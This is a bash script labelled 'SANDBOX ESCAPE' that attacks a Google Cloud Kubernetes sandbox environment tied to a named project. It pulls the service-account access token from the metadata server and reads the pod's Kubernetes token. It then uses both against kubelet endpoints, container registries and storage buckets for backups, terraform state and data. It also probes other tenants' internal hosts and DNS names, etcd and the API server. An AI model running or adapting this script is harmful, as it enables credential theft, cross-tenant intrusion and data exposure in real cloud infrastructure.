#!/bin/bash
echo "=== V5: SANDBOX ESCAPE ==="
date -u; hostname

MD="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"
TOKEN=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

echo "=== 1. NODE IP + KUBELET API ==="
NODE_IP=$(curl -s -m 5 -H "$MH" "$MD/instance/network-interfaces/0/ip")
echo "node_ip: $NODE_IP"
curl -s -m 5 -H "$MH" "$MD/instance/network-interfaces/0/access-configs/0/external-ip" 2>&1; echo
echo "-- kubelet 10250 --"
curl -sk -m 5 "https://$NODE_IP:10250/pods" 2>&1 | head -c 2000; echo
echo "-- kubelet 10255 readonly --"
curl -s -m 5 "http://$NODE_IP:10255/pods" 2>&1 | head -c 2000; echo
echo "-- kubelet healthz --"
curl -sk -m 5 "https://$NODE_IP:10250/healthz" 2>&1; echo
echo "-- kubelet runningpods --"
curl -sk -m 5 "https://$NODE_IP:10250/runningpods/" 2>&1 | head -c 2000; echo
echo "-- kubelet with SA token --"
K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -m 5 -H "Authorization: Bearer $K8S" "https://$NODE_IP:10250/pods" 2>&1 | head -c 3000; echo

echo "=== 2. CONTAINER REGISTRY ==="
echo "-- gcr.io catalog --"
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://gcr.io/v2/_catalog" 2>&1 | head -c 1000; echo
echo "-- gcr.io project --"
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://gcr.io/v2/yextenv-sbx/tags/list" 2>&1 | head -c 1000; echo
echo "-- us.gcr.io --"
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://us.gcr.io/v2/yextenv-sbx/tags/list" 2>&1 | head -c 1000; echo

echo "=== 3. GCS KNOWN BUCKETS ==="
for bucket in artifacts.yextenv-sbx.appspot.com us.artifacts.yextenv-sbx.appspot.com yextenv-sbx yextenv-sbx-terraform yextenv-sbx-backups yextenv-sbx-data; do
  RESP=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/$bucket/o?maxResults=3")
  echo "$bucket -> $RESP"
  if [ "$RESP" = "200" ]; then
    curl -s -m 5 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/$bucket/o?maxResults=3" 2>&1 | head -c 2000; echo
  fi
done

echo "=== 4. CROSS-TENANT HTTP ==="
for ip in 10.192.33.158 10.192.46.217 10.192.36.214 10.192.41.129 10.192.37.122; do
  echo "--- $ip ---"
  echo -n "CBD:1234 "; curl -s -m 3 -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" "http://$ip:1234/" 2>&1; echo
  echo -n "Git:7263 "; curl -s -m 3 -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" "http://$ip:7263/" 2>&1; echo
  echo -n "Init:1212 "; curl -s -m 3 -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" "http://$ip:1212/" 2>&1; echo
done

echo "=== 5. CROSS-TENANT VIA DNS ==="
NS=live-preview-sbx
for sid in 032945ae 223c1f9d 3abe0e96 3b26058e; do
  echo -n "live-preview-$sid.$NS.svc -> "
  nslookup "live-preview-$sid.$NS.svc.cluster.local" 2>&1 | grep -i address | tail -1
done

echo "=== 6. PROJECT METADATA ==="
curl -s -m 5 -H "$MH" "$MD/project/attributes/?recursive=true" 2>&1 | head -c 3000; echo
echo "-- all SAs recursive --"
curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/?recursive=true" 2>&1 | head -c 2000; echo
echo "-- instance tags --"
curl -s -m 5 -H "$MH" "$MD/instance/tags" 2>&1; echo
echo "-- disks --"
curl -s -m 5 -H "$MH" "$MD/instance/disks/?recursive=true" 2>&1 | head -c 1000; echo

echo "=== 7. INTERNAL SERVICES ==="
K8S_HOST=$KUBERNETES_SERVICE_HOST
echo "k8s_host: $K8S_HOST"
echo -n "etcd 2379: "; curl -sk -m 3 "https://$K8S_HOST:2379/version" 2>&1 | head -c 300; echo
echo -n "apiserver 8080: "; curl -s -m 3 "http://$K8S_HOST:8080/api" 2>&1 | head -c 300; echo

echo "=== 8. EXTERNAL REACHABILITY ==="
echo -n "internet: "; curl -s -m 5 -o /dev/null -w "HTTP %{http_code}" "https://httpbin.org/ip" 2>&1; echo
echo -n "dns: "; nslookup google.com 2>&1 | grep -i address | tail -1

echo "=== 9. RAW SOCKET ==="
python3 -c "
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.settimeout(2)
    print('RAW SOCKET: CREATED')
    s.close()
except PermissionError:
    print('RAW SOCKET: denied')
except Exception as e:
    print(f'RAW SOCKET: {e}')
" 2>&1

echo "=== 10. PROCESSES ==="
for pid in 1 $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -20); do
  CMD=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 100)
  [ -n "$CMD" ] && echo "PID $pid: $CMD"
done

echo "=== DONE ==="
